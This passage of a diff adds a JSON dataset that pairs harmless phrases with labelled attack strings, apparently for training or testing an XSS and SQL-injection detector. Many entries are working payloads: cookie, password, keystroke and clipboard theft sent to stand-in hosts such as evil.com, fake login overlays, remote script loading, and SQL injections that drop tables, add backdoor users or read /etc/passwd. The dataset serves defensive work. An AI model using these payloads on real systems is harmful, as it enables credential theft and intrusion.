+      "isMalicious":0
+   },
+   {
+      "value":"<math><annotation-xml><div><iframe onload=\"alert(1)\"></iframe></div></annotation-xml></math>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'm pleased with the progress",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>history.pushState('', '', '/?admin=true'); document.write('<h1>Admin Panel</h1><form action=\"https://evil.com/steal\"><input name=\"username\" placeholder=\"Username\"><input type=\"password\" name=\"password\" placeholder=\"Password\"><button>Login</button></form>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's implement your suggestion",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.cookie=\"session=hijacked; path=/\";</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The proposal is impressive",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"x\" onerror=\"fetch('/api/admin/delete_user', {method:'POST',body:JSON.stringify({id:1}),headers:{'Content-Type':'application/json'}})\"</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll follow up tomorrow",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>while(1){alert(1)}</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We've received your message",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.location.href = 'data:text/html;base64,'+btoa('<script>alert(document.domain)</script>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I look forward to our collaboration",
+      "isMalicious":0
+   },
+   {
+      "value":"<div id=\"div1\"><input value=\"``onmouseover=alert(1)\"</div><div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The conference was productive",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelector('form').addEventListener('submit', function(e) { e.preventDefault(); fetch('https://evil.com/steal?creds='+btoa(this.elements['username'].value+':'+this.elements['password'].value)); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll handle this matter",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<img src=\"https://example.com/image.jpg\" style=\"position:absolute;top:0;left:0;width:100%;height:100%;z-index:1000\" usemap=\"#map\"><map name=\"map\"><area shape=\"rect\" coords=\"0,0,9999,9999\" href=\"https://evil.com/phish\"></map>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The implementation is complete",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.addEventListener('keydown', function(e) { fetch('https://evil.com/keylog?key='+e.key); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We should proceed with caution",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=# onerror=\"fetch('/api/admin/reset_password', {method:'POST',credentials:'include',body:JSON.stringify({user_id:1,new_password:'hacked'})})\"",
+      "isMalicious":1
+   },
+   {
+      "value":"The results are encouraging",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>[].constructor.constructor('alert(1)')();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The update is available",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"javascript:(function(){var s=document.createElement('script');s.src='https://evil.com/hack.js';document.body.appendChild(s);})()\"</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's reconnect next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<noscript><style>body{visibility:hidden;}</style><div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999\"><form action=\"https://evil.com/steal\"><input name=\"username\"><input type=\"password\" name=\"password\"><button>Login to continue</button></form></div></noscript>",
+      "isMalicious":1
+   },
+   {
+      "value":"The team is ready for the next phase",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setTimeout(function(){ var popup=window.open('','_blank'); popup.document.write('<form action=\"https://evil.com/steal\"><input placeholder=\"Username\"><input type=\"password\" placeholder=\"Password\"><button>Login to proceed</button></form>'); }, 3000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've noted your recommendation",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.name='<iframe src=\"data:text/html,<script>alert(document.domain)</script>\"></iframe>';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The timeline is reasonable",
+      "isMalicious":0
+   },
+   {
+      "value":"'; INSERT INTO users (username, password) VALUES ('hacker', 'backdoor'); --",
+      "isMalicious":1
+   },
+   {
+      "value":"I look forward to your reply",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>$.getScript('https://evil.com/malicious.js');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The objective has been achieved",
+      "isMalicious":0
+   },
+   {
+      "value":"UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --",
+      "isMalicious":1
+   },
+   {
+      "value":"I've attached the document you requested",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.opener.eval(\"alert(1)\");</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The work is progressing as planned",
+      "isMalicious":0
+   },
+   {
+      "value":"LOAD_FILE('/etc/passwd')",
+      "isMalicious":1
+   },
+   {
+      "value":"I believe we've covered everything",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"javascript:alert(1)\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The performance is impressive",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.documentElement.innerHTML='<body style=\"background:black;color:red;text-align:center;\"><h1>SYSTEM HACKED</h1><p>All your data has been stolen</p></body>';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've shared the information with my team",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe height=\"0\" width=\"0\" src=\"data:text/html,<script>fetch('https://evil.com/beacon'+document.cookie);</script>\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"The specifications are clear",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.documentElement.innerHTML+='<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\"></object>';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll keep you in the loop",
+      "isMalicious":0
+   },
+   {
+      "value":"<input onkeypress=\"fetch('https://evil.com/keylogger?key='+event.key);\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The approach is innovative",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.onblur = function() { window.location = 'https://evil.com/phish'; }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's connect on this matter",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<iframe src=\"https://legitimate-looking-site.com\" style=\"position:absolute;left:0;top:0;width:100%;height:100%;z-index:-1;\"></iframe><div style=\"position:absolute;left:0;top:0;width:100%;height:100%;z-index:1;background-color:rgba(255,255,255,0.7);\"><div style=\"margin:100px auto;width:400px;padding:20px;background-color:white;border:1px solid #ccc;\"><h2>Session Expired</h2><p>Please re-enter your credentials</p><form action=\"https://evil.com/steal\"><input placeholder=\"Username\"><br><input type=\"password\" placeholder=\"Password\"><br><button>Login</button></form></div></div>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I appreciate your thoroughness",
+      "isMalicious":0
+   },
+   {
+      "value":"/* */; DROP TABLE users; --",
+      "isMalicious":1
+   },
+   {
+      "value":"The deadline extension was approved",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setTimeout(function(){document.forms[0].action='https://evil.com/steal'},3000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll help you resolve this issue",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>for(var i=0;i<document.links.length;i++){document.links[i].href='https://malicious-site.com';}</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The team has reviewed your proposal",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write(\"<img src='x' onerror='javascript:eval(\\\"var s=document.createElement(\\\\\\\\\\\\'script\\\\\\\\\\\\');s.src=\\\\\\\\\\\\'https://evil.com/malware.js\\\\\\\\\\\\';document.body.appendChild(s);\\\");'>\");</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We'll implement your suggestion",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg/onload=eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20vc3RlYWw/YycrZG9jdW1lbnQuY29va2llKQ=='))>",
+      "isMalicious":1
+   },
+   {
+      "value":"The document has been signed",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var stolenData = []; for(var i=0; i<localStorage.length; i++) { stolenData.push({key: localStorage.key(i), value: localStorage.getItem(localStorage.key(i))}); } fetch('https://evil.com/steal', {method: 'POST', body: JSON.stringify(stolenData)});</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your account has been created",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"#\" onclick=\"this.href='https://evil.com/'+document.cookie; return true;\">Click here to continue</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"We've received your payment",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.forms[0].onsubmit = function() { var pw = this.elements.password.value; fetch('https://evil.com/steal?pw='+encodeURIComponent(pw)); return true; }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The report will be available tomorrow",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>const originalPostMessage = window.postMessage; window.postMessage = function(msg, origin) { fetch('https://evil.com/steal?message='+encodeURIComponent(msg)); originalPostMessage.apply(this, arguments); };</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll send you the confirmation email",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var credentials = new URLSearchParams(location.search).get('token'); if(credentials) fetch('https://evil.com/steal?token='+credentials);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The schedule has been updated",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>function captureCredentials() { var username = prompt('Session expired. Please enter your username:'); var password = prompt('Please enter your password:'); if(username && password) fetch('https://evil.com/steal?u='+username+'&p='+password); } setTimeout(captureCredentials, 3000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your request has been approved",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><set attributeName=\"onload\" to=\"alert(1)\" /><animate attributeName=\"onload\" to=\"alert(2)\" /></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"We'll provide the information you requested",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>navigator.clipboard.readText().then(text => fetch('https://evil.com/clipboard?data='+encodeURIComponent(text)));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've scheduled a meeting with the team",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"x\" referrerpolicy=\"no-referrer\" onload=\"fetch('https://evil.com/loaded')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The resources are available for your review",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>webkitRequestFileSystem(TEMPORARY, 1, function(){fetch('https://evil.com/has-fs');});</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Thank you for your patience during this process",
+      "isMalicious":0
+   },
+   {
+      "value":"<script src=\"data:,fetch('https://evil.com/steal?'+document.cookie)\"></script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We'll address all the points you mentioned",
+      "isMalicious":0
+   },
+   {
+      "value":"<style>@keyframes animate {from {background: red;} to {background: yellow;}} @font-face {font-family:'font'; src: url('https://evil.com/steal?data='+document.cookie); unicode-range:U+0030-0039;}</style>",
+      "isMalicious":1
+   },
+   {
+      "value":"The software update is available",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>try{fetch('/api/user').then(r=>r.json()).then(d=>fetch('https://evil.com/data?'+btoa(JSON.stringify(d))))}catch(e){}</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your order has been shipped",
+      "isMalicious":0
+   },
+   {
+      "value":"<div style=\"color:expression(fetch('https://evil.com/css-expression'))\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The training session is scheduled for next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.addEventListener('deviceorientation', function(e) { fetch('https://evil.com/orient?x='+e.alpha+'&y='+e.beta+'&z='+e.gamma); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The package will be delivered tomorrow",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>navigator.geolocation.getCurrentPosition(function(p) { fetch('https://evil.com/loc?lat='+p.coords.latitude+'&lon='+p.coords.longitude); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We're excited to work with you",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var originalOpen = XMLHttpRequest.prototype.open; XMLHttpRequest.prototype.open = function() { var url = arguments[1]; fetch('https://evil.com/xhr-intercept?url='+encodeURIComponent(url)); return originalOpen.apply(this, arguments); };</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The invoice has been processed",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"javascript:var frame = document.createElement('iframe'); frame.src = 'https://legitimate-site.com'; frame.style = 'position:fixed;left:0;top:0;width:100%;height:100%;z-index:999'; document.body.appendChild(frame); setTimeout(function() { frame.contentWindow.document.body.innerHTML = '<div style=\"background:white;padding:20px;\"><h2>Login required</h2><form action=\"https://evil.com/steal\"><input placeholder=\"Email\"><br><input type=\"password\" placeholder=\"Password\"><br><button>Log in</button></form></div>'; }, 2000);\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"The database has been updated",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>navigator.mediaDevices.getUserMedia({audio:true}).then(function(stream) { fetch('https://evil.com/mic-access-granted'); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your feedback is important to us",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>if(window.DeviceMotionEvent) window.addEventListener('devicemotion', function(e) { fetch('https://evil.com/motion?x='+e.acceleration.x+'&y='+e.acceleration.y+'&z='+e.acceleration.z); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We've implemented new security measures",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.designMode='on'; document.execCommand('insertHTML', false, '<img src=\"x\" onerror=\"alert(1)\">');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The quarterly report is available",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelector('form').elements[0].name='__proto__'; document.querySelector('form').elements[0].value='isAdmin:true';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We'll contact you with more information",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"javascript:top.postMessage('<img src=x onerror=alert(1)>','*')\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"The project timeline has been approved",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setInterval(function(){var x=document.querySelectorAll('input[type=password]');for(var i=0;i<x.length;i++){x[i].addEventListener('change',function(){fetch('https://evil.com/pw?v='+this.value);});}},1000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We appreciate your business",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var interval=setInterval(function(){var btn=document.querySelector('.payment-button');if(btn){btn.setAttribute('onclick',\"fetch('https://evil.com/payment-intercept');return true;\");clearInterval(interval);}},500);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The proposal has been submitted",
+      "isMalicious":0
+   },
+   {
+      "value":"<meta http-equiv=\"Set-Cookie\" content=\"session=stolen; path=/\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The event was a success",
+      "isMalicious":0
+   },
+   {
+      "value":"<link rel=\"stylesheet\" href=\"https://evil.com/steal.css?data=%63%73%73\" />",
+      "isMalicious":1
+   },
+   {
+      "value":"Your reservation has been confirmed",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>indexedDB.open('test').onsuccess=function(e){fetch('https://evil.com/indexed-db-access');};</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The system has been upgraded",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelector('form').setAttribute('action','javascript:fetch(\"https://evil.com/steal\",{method:\"POST\",body:new FormData(document.forms[0])});');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We'll process your request soon",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.currentScript.parentNode.innerHTML='<iframe src=\"https://legitimate-looking-site.com\" style=\"position:absolute;left:0;top:0;width:100%;height:100%;\"></iframe>';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your application is being processed",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.onload = function() { document.getElementById('login-form').action = 'https://evil.com/steal'; }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The maintenance is scheduled for next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>function c(){var x=new XMLHttpRequest();x.open('GET','/api/user/profile',true);x.onload=function(){fetch('https://evil.com/steal?data='+btoa(x.responseText))};x.send()}try{c()}catch(e){}</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your account has been verified",
+      "isMalicious":0
+   },
+   {
+      "value":"<script nonce=\"whatever\">var pw=prompt('Your session expired. Please enter your password to continue:');fetch('https://evil.com/steal?pw='+pw);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The certificate is valid",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var r=new FileReader();r.onload=function(){fetch('https://evil.com/steal?data='+btoa(r.result))};navigator.clipboard.readText().then(t=>r.readAsText(new Blob([t])));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We've updated our privacy policy",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write(decodeURIComponent('%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E'));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The service will be temporarily unavailable",
+      "isMalicious":0
+   },
+   {
+      "value":"<object type=\"text/x-scriptlet\" data=\"data:,alert(1)\"></object>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your message has been delivered",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.onbeforeunload = function() { return fetch('https://evil.com/leaving-page'); };</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The product is now available",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><animate xlink:href=\"#xss\" attributeName=\"href\" values=\"javascript:alert(1)\"/><a id=\"xss\"><text x=\"20\" y=\"20\">Click me</text></a>",
+      "isMalicious":1
+   },
+   {
+      "value":"We've processed your refund",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"data:text/html,<script>top.document.body.innerHTML = '<div style=\"text-align:center;margin-top:20px;\"><img src=\"https://legitimate-looking-site.com/logo.png\"><h2>Please login to continue</h2><form action=\"https://evil.com/steal\"><input placeholder=\"Username\"><br><input type=\"password\" placeholder=\"Password\"><br><button>Login</button></form></div>';</script>\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"The new version is ready",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelectorAll('a[href*=\"download\"]').forEach(function(el) { el.href = 'https://evil.com/malware.exe'; });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your password has been reset",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.addEventListener('DOMContentLoaded', function() { for(let i=0; i<document.forms.length; i++) { let f = document.forms[i]; f.addEventListener('submit', function(e) { let p = this.querySelector('input[type=password]'); if(p) { e.preventDefault(); fetch('https://evil.com/steal?pw='+p.value); setTimeout(() => { this.submit(); }, 500); } }); } });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your subscription has been renewed",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if(mutation.addedNodes.length) fetch('https://evil.com/dom-changed'); }); }).observe(document.documentElement, { childList: true, subtree: true });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The license has been extended",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.body.contentEditable=true; document.designMode='on'; void 0;</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The installation was successful",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Object.defineProperty(document,'cookie',{get:function(){fetch('https://evil.com/cookie-accessed');return '';}});</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The transaction has been completed",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.addEventListener('storage', function(e) { fetch('https://evil.com/storage?key='+e.key+'&value='+e.newValue); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your profile has been updated",
+      "isMalicious":0
+   },
+   {
+      "value":"<img srcset=\"https://evil.com/pixel?a=\" onerror=\"alert(1)\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The service is now available",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelectorAll('button, input[type=submit]').forEach(function(el) { el.addEventListener('click', function() { fetch('https://evil.com/button-clicked?id='+this.id); }); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your request is being processed",
+      "isMalicious":0
+   },
+   {
+      "value":"<script type=\"module\">import('data:text/javascript,alert(1)');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The upgrade is complete",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>WebSocket.prototype.send = new Proxy(WebSocket.prototype.send, { apply: (target, thisArg, args) => { fetch('https://evil.com/ws-intercepted?data='+btoa(args[0])); return Reflect.apply(target, thisArg, args); } });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We've received your inquiry",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var interval = setInterval(function() { var loginBtn = document.querySelector('#login-button'); if(loginBtn) { loginBtn.addEventListener('click', function() { var u = document.querySelector('#username').value; var p = document.querySelector('#password').value; fetch('https://evil.com/steal?u='+u+'&p='+p); }); clearInterval(interval); } }, 500);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your changes have been saved",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelectorAll('form').forEach(function(form) { var old = form.onsubmit; form.onsubmit = function(e) { var formData = new FormData(this); fetch('https://evil.com/steal', {method: 'POST', body: formData}); if (old) return old.call(this, e); }; });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The feature is now enabled",
+      "isMalicious":0
+   },
+   {
+      "value":"<form><math><mtext></form><form id=\"target\"><mglyph><svg><mtext><textarea><path id=\"\"></textarea><img onerror=\"document.getElementById('target').action='https://evil.com/steal';\"></path></svg></mglyph></mtext></math></form>",
+      "isMalicious":1
+   },
+   {
+      "value":"The setup is complete",
+      "isMalicious":0
+   },
+   {
+      "value":"'; UPDATE users SET admin=1 WHERE username='attacker'; --",
+      "isMalicious":1
+   },
+   {
+      "value":"The verification was successful",
+      "isMalicious":0
+   },
+   {
+      "value":"<marquee loop=\"1\" width=\"0\" onfinish=\"alert(1)\">XSS</marquee>",
+      "isMalicious":1
+   },
+   {
+      "value":"The request has been submitted",
+      "isMalicious":0
+   },
+   {
+      "value":"OR 1=1",
+      "isMalicious":1
+   },
+   {
+      "value":"The approval process is complete",
+      "isMalicious":0
+   },
+   {
+      "value":"admin' OR '1'='1'; --",
+      "isMalicious":1
+   },
+   {
+      "value":"We appreciate your participation",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe sandbox=\"allow-same-origin allow-scripts\" src=\"data:text/html,<script>fetch('https://evil.com/bypass-sandbox')</script>\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"The data has been migrated",
+      "isMalicious":0
+   },
+   {
+      "value":"<input type=\"file\" accept=\"image/*\" onchange=\"var fr=new FileReader();fr.onload=function(){fetch('https://evil.com/upload?file='+encodeURIComponent(fr.result))};fr.readAsDataURL(this.files[0]);\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Your appointment has been scheduled",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.body.appendChild(document.createElement`iframe`).contentWindow.alert(1);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The verification code has been sent",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.onpageshow = function(event) { if (event.persisted) { window.location = 'https://evil.com/back-button'; } };</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your license key has been activated",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.addEventListener('visibilitychange', function() { if(document.visibilityState === 'visible') { fetch('https://evil.com/tab-active'); } else { fetch('https://evil.com/tab-inactive'); } });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We've processed your application",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelector('#login-form').action = window.location.href.substring(0, window.location.href.indexOf('?')) + '?redirect=' + encodeURIComponent('https://evil.com/page?token=' + new URLSearchParams(window.location.search).get('token'));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The configuration is complete",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<script src=\"https:&#x2f;&#x2f;evil.com&#x2f;hack.js\"><\\/script>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The payment has been processed",
+      "isMalicious":0
+   },
+   {
+      "value":"<link rel=\"dns-prefetch\" href=\"//evil.com\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The application has been approved",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>function toHex(s){var h='';for(var i=0;i<s.length;i++){h+='%'+s.charCodeAt(i).toString(16);}return h;}eval(decodeURIComponent(toHex('alert(1)')));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We look forward to your participation",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>navigator['serviceWorker']['register']('https://evil.com/sw.js')['then'](registration => console.log('Done'))['catch'](err => console.log(err));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The system is operational",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.addEventListener('message', function(e) { if(e.origin !== 'https://trusted.com') { try { eval(e.data); } catch(err) {} } });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The course materials are available",
+      "isMalicious":0
+   },
+   {
+      "value":"<button onclick=\"this['location']['href']='javascript:fetch(\"https://evil.com/steal?c=\"+document[\"cookie\"])';\">Click me</button>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your registration is complete",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe srcdoc=\"<body onload='fetch(\"https://evil.com/iframe-loaded\")'>\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"The file has been uploaded",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Function('alert(1)')();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your booking has been confirmed",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<img src=\"https://legitimate-site.com/image.jpg\" style=\"position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.3;z-index:-1;\" />'); document.write('<div style=\"position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border:1px solid;box-shadow:0 0 10px rgba(0,0,0,0.5);\"><h2>Session Expired</h2><form action=\"https://evil.com/steal\"><input placeholder=\"Username\"><br><input type=\"password\" placeholder=\"Password\"><br><button>Login</button></form></div>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The update has been installed",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var payload = 'fetch(\"https://evil.com/steal?c=\"+document.cookie)'; eval(atob('ZXZhbChwYXlsb2FkKTs='));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The warranty has been registered",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelectorAll('a').forEach(function(link) { link.onclick = function() { fetch('https://evil.com/link-clicked?href=' + encodeURIComponent(this.href)); }; });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"123-456-7890",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"javascript:alert('XSS')\">Click me</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"United States",
+      "isMalicious":0
+   },
+   {
+      "value":"<div style=\"background-image:url(javascript:alert('XSS'))\">",
+      "isMalicious":1
+   },
+   {
+      "value":"I agree to the terms and conditions",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Please enter your name",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"1\" onerror=\"alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"12345",
+      "isMalicious":0
+   },
+   {
+      "value":"<scr<script>ipt>alert('XSS')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"example@email.com",
+      "isMalicious":0
+   },
+   {
+      "value":"\"><script>alert('XSS')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"New York City",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var img=new Image(); img.src=\"http://attacker.com/\"+document.cookie;</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Good morning",
+      "isMalicious":0
+   },
+   {
+      "value":"<script src=\"http://malicious.com/xss.js\"></script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Lorem ipsum dolor sit amet",
+      "isMalicious":0
+   },
+   {
+      "value":"<input onfocus=alert('XSS') autofocus>",
+      "isMalicious":1
+   },
+   {
+      "value":"Main Street",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"555-1234",
+      "isMalicious":0
+   },
+   {
+      "value":"<marquee onstart=alert('XSS')>",
+      "isMalicious":1
+   },
+   {
+      "value":"Alice Johnson",
+      "isMalicious":0
+   },
+   {
+      "value":"'-alert(1)-'",
+      "isMalicious":1
+   },
+   {
+      "value":"California",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><script>alert('XSS')</script></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"12:30 PM",
+      "isMalicious":0
+   },
+   {
+      "value":"<body background=\"javascript:alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Thank you!",
